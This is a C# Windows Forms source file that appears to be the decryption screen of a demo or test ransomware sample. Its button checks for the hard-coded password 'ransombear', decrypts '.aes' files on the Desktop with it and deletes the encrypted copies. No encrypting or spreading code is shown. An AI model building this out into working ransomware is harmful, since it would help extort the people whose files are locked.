using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime;
using System.Runtime.InteropServices;
using System.IO;

namespace cwg.sourceIL
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();


        }
        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void decryptButton_Click(object sender, EventArgs e)
        {
            if (passwordBox.Text == "ransombear")
            {
                //Copy files from Desktop to the c:\
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                var files = Directory.GetFiles(desktopPath);
                foreach (var srcPath in files)
                {
                    if (srcPath.Contains(".aes")){
                        string destPath = srcPath.Replace(".aes", ".txt");
                        DecryptFiles.FileDecrypt(srcPath, destPath, "ransombear");
                        File.Delete(srcPath);
                    }

                }
                

            }
        }
    }
}
